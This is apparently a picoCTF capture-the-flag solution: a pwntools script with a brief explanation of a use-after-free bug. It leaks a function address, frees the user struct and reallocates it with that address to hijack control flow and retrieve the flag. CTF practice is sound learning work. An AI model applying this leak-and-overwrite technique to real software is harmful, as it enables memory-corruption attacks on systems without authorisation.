"""
the vulnerability is that the program keep using the "user" struct after freeing him.
what I did is that to:
    1) get leaked function address.
    2) free user.
    3) malloc line and insert the leaked function address.
"""


#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe

ADDRESS = "mercury.picoctf.net"
PORT = 48259

def conn():
    context.log_level = logging.DEBUG
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote(ADDRESS, PORT)

    return r


def get_leaked_address(r):
    r.send("S".encode())
    address_str = r.recvline().decode().split("0x")[1]
    r.info(f"address leaked is 0x{address_str}")
    address = int(address_str, 16)
    return address


def free_user(r):
    r.send("I".encode())
    r.recvline()
    r.send("Y".encode()) 



def main():
    r = conn()
    log.info("starting connection")
    r.recvuntil(b"(e)xit\n")

    solve_function_address = get_leaked_address(r)
    r.recvuntil(b"(e)xit\n")

    free_user(r)
    r.recvuntil(b"(e)xit\n")

    r.send("L".encode())
    r.recvuntil(b"anyways:\n")

    # Writing address on freed user.
    r.send(solve_function_address.to_bytes(8, byteorder="little"))
    flag = r.recvline().decode().split("\n")[0]
    r.info(f"------------{flag}--------------")  


if __name__ == "__main__":
    main()
